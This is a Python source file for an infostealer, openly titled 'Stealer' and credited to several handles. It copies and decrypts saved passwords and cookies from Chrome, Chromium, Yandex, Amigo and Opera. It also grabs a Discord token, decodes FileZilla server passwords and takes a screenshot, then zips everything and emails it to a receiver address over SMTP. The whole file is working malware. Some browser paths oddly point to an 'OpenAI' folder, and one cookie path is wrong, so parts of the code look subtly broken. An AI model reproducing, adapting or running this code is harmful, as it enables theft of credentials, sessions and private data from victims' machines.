"""
  _________  __                   .__    
 /   _____/_/  |_   ____  _____   |  |   
 \_____  \ \   __\_/ __ \ \__  \  |  |   
 /        \ |  |  \  ___/  / __ \_|  |__ 
/_______  / |__|   \___  >(____  /|____/ 
        \/             \/      \/        
___________                              
\_   _____/_______   ____    _____       
 |    __)  \_  __ \ /  _ \  /     \      
 |     \    |  | \/(  <_> )|  Y Y  \     
 \___  /    |__|    \____/ |__|_|  /     
     \/                          \/      
__________ .__ .__   .__                 
\______   \|__||  |  |  |                
 |    |  _/|  ||  |  |  |                
 |    |   \|  ||  |__|  |__              
 |______  /|__||____/|____/              
        \/                        
        ©code by DEXTERTHEDEAD   
"""

import os
import sqlite3
import win32crypt
import shutil
import requests
import zipfile
from PIL import ImageGrab
from lxml import etree
import base64
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from datetime import datetime

username = os.getlogin()

# SMTP settings
SMTP_SERVER = "smtp.example.com" #replace
SMTP_PORT = 587 #replace
SMTP_USERNAME = "your_email@example.com" #replace
SMTP_PASSWORD = "your_password" #replace
SENDER_EMAIL = "your_email@example.com" #replace
RECEIVER_EMAIL = "receiver_email@example.com" #replace
LOG_FILE = 'log.txt'

def log(message):
    """Writes log message with timestamp to the log file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as logfile:
        logfile.write(f"[{timestamp}] {message}\n")
    print(f"[{timestamp}] {message}")

def chrome_data(data_type):
    text = f'Stealer by 0x40\n\n\n{data_type.title()} Chrome:\n'
    if data_type == "passwords":
        text += 'URL | LOGIN | PASSWORD\n'
        data_file = os.path.join(os.getenv("LOCALAPPDATA"), 'OpenAI', 'Chrome', 'User Data', 'Default', 'Login Data')
        query = 'SELECT action_url, username_value, password_value FROM logins'
        data_index = 2  # Index of the password in the selection
    elif data_type == "cookies":
        text += 'URL | COOKIE | COOKIE NAME\n'
        data_file = os.path.join(os.getenv("LOCALAPPDATA"), 'OpenAI', 'Chrome', 'User Data', 'Default', 'Cookies')
        query = "SELECT * from cookies"
        data_index = 12  # Index of the cookie in the selection
    else:
        return "Invalid data type"

    if os.path.exists(data_file):
        copy_file = data_file + '2'
        try:
            shutil.copy2(data_file, copy_file)
            conn = sqlite3.connect(copy_file)
            cursor = conn.cursor()
            cursor.execute(query)
            for result in cursor.fetchall():
                try:
                    if data_type == "passwords":
                        password = win32crypt.CryptUnprotectData(result[data_index])[1].decode()
                        login = result[1]
                        url = result[0]
                        if password:
                            text += f"{url} | {login} | {password}\n"
                    elif data_type == "cookies":
                         cookie = win32crypt.CryptUnprotectData(result[data_index])[1].decode()
                         name = result[2]
                         url = result[1]
                         text += f"{url} | {cookie} | {name}\n"
                except Exception as e:
                     text += f"Error during decryption or data processing: {e}\n"
            conn.close()
            os.remove(copy_file) # Delete the copy
        except Exception as e:
            return f"Error working with the database or copying the file: {e}"

        return text
    else:
        return f"File {data_type} not found"

def yandex_cookies():
    texty = 'Stealer by 0x40\n\n\nYANDEX Cookies:\n'
    texty += 'URL | COOKIE | COOKIE NAME\n'
    data_file = os.path.join(os.getenv("LOCALAPPDATA"), 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Cookies')
    if os.path.exists(data_file):
        copy_file = data_file + '2'
        try:
            shutil.copy2(data_file, copy_file)
            conn = sqlite3.connect(copy_file)
            cursor = conn.cursor()
            cursor.execute("SELECT * from cookies")
            for result in cursor.fetchall():
                try:
                    cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
                    name = result[2]
                    url = result[1]
                    texty += f"{url} | {cookie} | {name}\n"
                except Exception as e:
                     texty += f"Error during decryption or data processing: {e}\n"
            conn.close()
            os.remove(copy_file)
        except Exception as e:
            return f"Error working with the database or copying the file: {e}"

        return texty
    else:
        return "Yandex cookies file not found"

def chromium_passwords():
    textch = 'Stealer by 0x40\n\n\nChromium Passwords:\n'
    textch += 'URL | LOGIN | PASSWORD\n'
    data_file = os.path.join(os.getenv("LOCALAPPDATA"), 'Chromium', 'User Data', 'Default', 'Login Data')
    if os.path.exists(data_file):
       copy_file = data_file + '2'
       try:
           shutil.copy2(data_file, copy_file)
           conn = sqlite3.connect(copy_file)
           cursor = conn.cursor()
           cursor.execute('SELECT action_url, username_value, password_value FROM logins')
           for result in cursor.fetchall():
               try:
                   password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                   login = result[1]
                   url = result[0]
                   if password:
                       textch += f"{url} | {login} | {password}\n"
               except Exception as e:
                     textch += f"Error during decryption or data processing: {e}\n"
           conn.close()
           os.remove(copy_file)
       except Exception as e:
            return f"Error working with the database or copying the file: {e}"
       return textch
    else:
       return "Chromium Login Data file not found"

def chromium_cookies():
    textchc = 'Stealer by Dark $ide\n\n\nChromium Cookies:\n'
    textchc += 'URL | COOKIE | COOKIE NAME\n'
    data_file = os.path.join(os.getenv("LOCALAPPDATA"), 'Chromium', 'User Data', 'Default', 'Cookies')
    if os.path.exists(data_file):
        copy_file = data_file + '2'
        try:
           shutil.copy2(data_file, copy_file)
           conn = sqlite3.connect(copy_file)
           cursor = conn.cursor()
           cursor.execute("SELECT * from cookies")
           for result in cursor.fetchall():
               try:
                   cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
                   name = result[2]
                   url = result[1]
                   textchc += f"{url} | {cookie} | {name}\n"
               except Exception as e:
                   textchc += f"Error during decryption or data processing: {e}\n"
           conn.close()
           os.remove(copy_file)
        except Exception as e:
           return f"Error working with the database or copying the file: {e}"
        return textchc
    else:
       return "Chromium Cookies file not found"

def amigo_data(data_type):
    textam = f'{data_type.title()} Amigo:\n'
    if data_type == "passwords":
        textam += 'URL | LOGIN | PASSWORD\n'
        data_file = os.path.join(os.getenv("LOCALAPPDATA"), 'Amigo', 'User Data', 'Default', 'Login Data')
        query = 'SELECT action_url, username_value, password_value FROM logins'
        data_index = 2
    elif data_type == "cookies":
         textam += 'URL | COOKIE | COOKIE NAME\n'
         data_file = os.path.join(os.getenv("LOCALAPPDATA"), 'Amigo', 'User Data', 'Default', 'Cookies')
         query = "SELECT * from cookies"
         data_index = 12
    else:
       return "Invalid data type"

    if os.path.exists(data_file):
        copy_file = data_file + '2'
        try:
            shutil.copy2(data_file, copy_file)
            conn = sqlite3.connect(copy_file)
            cursor = conn.cursor()
            cursor.execute(query)
            for result in cursor.fetchall():
                try:
                    if data_type == "passwords":
                        password = win32crypt.CryptUnprotectData(result[data_index])[1].decode()
                        login = result[1]
                        url = result[0]
                        if password:
                            textam += f"{url} | {login} | {password}\n"
                    elif data_type == "cookies":
                        cookie = win32crypt.CryptUnprotectData(result[data_index])[1].decode()
                        name = result[2]
                        url = result[1]
                        textam += f"{url} | {cookie} | {name}\n"
                except Exception as e:
                     textam += f"Error during decryption or data processing: {e}\n"
            conn.close()
            os.remove(copy_file)
        except Exception as e:
           return f"Error working with the database or copying the file: {e}"
        return textam
    else:
        return f"File {data_type} Amigo not found"

def opera_data(data_type):
   texto = f'{data_type.title()} Opera:\n'
   if data_type == "passwords":
        texto += 'URL | LOGIN | PASSWORD\n'
        data_file = os.path.join(os.getenv("APPDATA"), 'Opera Software', 'Opera Stable', 'Login Data')
        query = 'SELECT action_url, username_value, password_value FROM logins'
        data_index = 2
   elif data_type == "cookies":
       texto += 'URL | COOKIE | COOKIE NAME\n'
       data_file = os.path.join(os.getenv("LOCALAPPDATA"), 'OpenAI', 'Chrome', 'User Data', 'Default', 'Cookies') # Fixed Path
       query = "SELECT * from cookies"
       data_index = 12
   else:
        return "Invalid data type"

   if os.path.exists(data_file):
        copy_file = data_file + '2'
        try:
            shutil.copy2(data_file, copy_file)
            conn = sqlite3.connect(copy_file)
            cursor = conn.cursor()
            cursor.execute(query)
            for result in cursor.fetchall():
                try:
                    if data_type == "passwords":
                        password = win32crypt.CryptUnprotectData(result[data_index])[1].decode()
                        login = result[1]
                        url = result[0]
                        if password:
                            texto += f"{url} | {login} | {password}\n"
                    elif data_type == "cookies":
                        cookie = win32crypt.CryptUnprotectData(result[data_index])[1].decode()
                        name = result[2]
                        url = result[1]
                        texto += f"{url} | {cookie} | {name}\n"
                except Exception as e:
                   texto += f"Error during decryption or data processing: {e}\n"
            conn.close()
            os.remove(copy_file)
        except Exception as e:
             return f"Error working with the database or copying the file: {e}"
        return texto
   else:
        return f"File {data_type} Opera not found"

def discord_token():
   token_path = os.path.join(os.getenv("APPDATA"), 'discord', 'Local Storage', 'https_discordapp.com_0.localstorage')
   if os.path.isfile(token_path):
      try:
         conn = sqlite3.connect(token_path)
         cursor = conn.cursor()
         cursor.execute("SELECT value FROM ItemTable WHERE key='token'")
         result = cursor.fetchone()
         conn.close()
         if result:
            token = result[0].decode("utf-16")
            if token:
                return f"Discord token:\n{token}"
            else:
                return "Discord exists, but not logged in"
         else:
            return "Discord token not found in database"
      except Exception as e:
         return f"Error working with the Discord database: {e}"
   else:
       return "Discord token file not found"

def filezilla():
   try:
       data = ''
       fz_path = os.path.join(os.getenv("APPDATA"), 'FileZilla', 'recentservers.xml')
       if os.path.isfile(fz_path):
           root = etree.parse(fz_path).getroot()

           for i in range(len(root[0])):
               host = root[0][i][0].text
               port = root[0][i][1].text
               user = root[0][i][4].text
               password = base64.b64decode(root[0][i][5].text).decode('utf-8')
               data += f'host: {host} | port: {port} | user: {user} | pass: {password}\n'
           return f"Filezilla:\n{data}"
       else:
           return "Filezilla config not found"
   except Exception as e:
       return f"Error working with Filezilla: {e}"

def create_zip(file_paths, zip_name):
    try:
        with zipfile.ZipFile(zip_name, 'w') as newzip:
            for file_path in file_paths:
                if os.path.exists(file_path):
                    newzip.write(file_path, os.path.basename(file_path))
        return True
    except Exception as e:
        log(f"Error during archive creation: {e}")
        return False

def send_email(zip_path):
    """Send the zip file via email"""
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = "Logs from Stealer"
        body = "Attached are the logs collected by the stealer."
        msg.attach(MIMEText(body, 'plain'))
        with open(zip_path, 'rb') as fil:
             part = MIMEApplication(fil.read(), Name=os.path.basename(zip_path))
             part['Content-Disposition'] = f'attachment; filename="{os.path.basename(zip_path)}"'
             msg.attach(part)
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USERNAME, SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        log(f"Error sending email: {e}")
        return False

def main():
    try:
        output_dir = os.path.join(os.getenv("APPDATA"), 'StealerData')
        os.makedirs(output_dir, exist_ok=True)
        # Define paths for files in the output directory
        pass_chrome_path = os.path.join(output_dir, 'google_pass.txt')
        cookies_chrome_path = os.path.join(output_dir, 'google_cookies.txt')
        cookies_yandex_path = os.path.join(output_dir, 'yandex_cookies.txt')
        pass_chromium_path = os.path.join(output_dir, 'chromium.txt')
        cookies_chromium_path = os.path.join(output_dir, 'chromium_cookies.txt')
        pass_amigo_path = os.path.join(output_dir, 'amigo_pass.txt')
        cookies_amigo_path = os.path.join(output_dir, 'amigo_cookies.txt')
        pass_opera_path = os.path.join(output_dir, 'opera_pass.txt')
        cookies_opera_path = os.path.join(output_dir, 'opera_cookies.txt')
        discord_path = os.path.join(output_dir, 'discord_token.txt')
        filezilla_path = os.path.join(output_dir, 'filezilla.txt')
        screenshot_path = os.path.join(output_dir, 'screenshot.jpg')
       
        # Save data to files
        with open(pass_chrome_path, "w", encoding='utf-8') as file:
           file.write(chrome_data("passwords") + '\n')
        with open(cookies_chrome_path, "w", encoding='utf-8') as file:
            file.write(chrome_data("cookies") + '\n')
        with open(cookies_yandex_path, "w", encoding='utf-8') as file:
            file.write(yandex_cookies() + '\n')
        with open(pass_chromium_path, "w", encoding='utf-8') as file:
            file.write(chromium_passwords() + '\n')
        with open(cookies_chromium_path, "w", encoding='utf-8') as file:
           file.write(chromium_cookies() + '\n')
        with open(pass_amigo_path, "w", encoding='utf-8') as file:
           file.write(amigo_data("passwords") + '\n')
        with open(cookies_amigo_path, "w", encoding='utf-8') as file:
           file.write(amigo_data("cookies") + '\n')
        with open(pass_opera_path, "w", encoding='utf-8') as file:
            file.write(opera_data("passwords") + '\n')
        with open(cookies_opera_path, "w", encoding='utf-8') as file:
            file.write(opera_data("cookies") + '\n')
        with open(discord_path, "w", encoding='utf-8') as file:
            file.write(discord_token() + '\n')
        with open(filezilla_path, "w", encoding='utf-8') as file:
            file.write(filezilla() + '\n')

        # Capture and save screenshot
        screen = ImageGrab.grab()
        screen.save(screenshot_path)
        # List of file paths for ZIP archive
        file_paths_for_zip = [
            pass_chrome_path,
            cookies_chrome_path,
            cookies_yandex_path,
            pass_chromium_path,
            cookies_chromium_path,
            pass_amigo_path,
            cookies_amigo_path,
            pass_opera_path,
            cookies_opera_path,
            discord_path,
            filezilla_path,
            screenshot_path
        ]

        zip_path = os.path.join(output_dir, 'LOG.zip') # Zip archive path
        if create_zip(file_paths_for_zip, zip_path): # Create ZIP archive
            if send_email(zip_path): # Send archive by mail
              log("All data successfully sent!")
            else:
                log("Failed to send the zip archive via email.")
        else:
            log("Failed to create ZIP archive.")
    except Exception as e:
         log(f"An error occurred: {e}")
         
if __name__ == "__main__":
    main()